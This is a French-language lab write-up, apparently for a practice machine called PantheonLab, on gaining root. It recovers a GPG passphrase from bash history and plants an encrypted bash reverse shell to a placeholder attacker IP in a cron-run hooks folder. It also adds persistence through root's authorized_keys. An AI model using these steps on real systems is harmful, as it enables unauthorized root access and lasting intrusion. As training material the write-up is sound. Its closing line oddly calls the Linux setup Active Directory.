# Élévation de Privilèges

## Introduction

Cette section détaille les techniques d'élévation de privilèges exploitées dans l'environnement PantheonLab.

## Méthodes d'Élévation de Privilèges

### 1. Exploitation des Vulnérabilités Locales

Dans cet environnement, l'utilisateur `hera` dispose de droits suffisants pour exploiter un mécanisme d'élévation de privilèges automatisé.

#### Contexte

L'utilisateur `hera` appartient au groupe `juno`, ce qui lui confère certains droits supplémentaires sur le système. On peut le vérifier avec la commande suivante :

```bash
groups hera
```

Le dossier `/opt/hooks` possède des droits d'accès pour le groupe `juno`, permettant ainsi à tout membre de ce groupe de modifier ou d'ajouter des fichiers dans ce dossier :

```bash
ls -ld /opt/hooks
```

Ce dossier contient des scripts automatiquement exécutés par l'utilisateur `root` via une tâche cron toutes les minutes. Cependant, ces scripts sont chiffrés avec GPG, ce qui semble empêcher une modification directe.

#### Analyse du mécanisme

En listant le contenu de `/opt/hooks`, on remarque la présence de scripts chiffrés (extension `.gpg`). Un examen plus approfondi du système révèle que le mot de passe utilisé pour le chiffrement GPG est stocké en clair dans le fichier `~/.bash_history` de l'utilisateur `hera` :

```bash
cat ~/.bash_history
```

#### Exploitation

1. **Préparation de l'écoute sur la machine d'attaque** :
   Avant de déposer le script, il faut lancer un listener netcat sur sa propre machine pour recevoir la connexion :

   ```bash
   nc -lvnp <PORT>
   ```

2. **Création d'un reverse shell** :
   On écrit un script bash qui ouvre un reverse shell vers la machine d'attaque :

   ```bash
   bash -i >& /dev/tcp/<IP_ATTAQUANT>/<PORT> 0>&1
   ```

3. **Chiffrement du script** :
   On chiffre ce script avec GPG en utilisant le mot de passe récupéré. Pour automatiser et sécuriser le processus, on peut stocker temporairement le mot de passe dans un fichier protégé, puis le supprimer après usage :

   ```bash
   echo 'M0n@mourP0urZ3u$!2025' > pass.txt
   chmod 600 pass.txt
   gpg --batch --yes --passphrase-file pass.txt --symmetric reverseshell.sh
   rm pass.txt
   ```

   Cela génère un fichier `reverseshell.sh.gpg` chiffré avec le mot de passe contenu dans `pass.txt`.

4. **Dépôt dans /opt/hooks** :
   On place le fichier chiffré dans `/opt/hooks` :

   ```bash
   mv reverseshell.sh.gpg /opt/hooks/
   ```

5. **Attente de l'exécution** :
   Il suffit alors d'attendre une minute pour que la tâche cron exécutée par root déchiffre et lance le script, ouvrant ainsi un shell root sur la machine d'attaque.

#### Résumé

Ce scénario illustre l'importance de ne jamais stocker de mots de passe sensibles en clair et de bien contrôler les scripts exécutés automatiquement avec des privilèges élevés.

### 2. Techniques de Persistance

Après avoir obtenu un accès root, la méthode de persistance la plus simple et discrète consiste à ajouter sa propre clé publique SSH dans le fichier `~/.ssh/authorized_keys` de l'utilisateur root :

```bash
echo "<clé_publique>" >> /root/.ssh/authorized_keys
```

Cela permet de se reconnecter facilement en tant que root sans avoir besoin du mot de passe.

## Conclusion

L'élévation de privilèges est une étape cruciale dans l'exploitation d'un environnement Active Directory. 
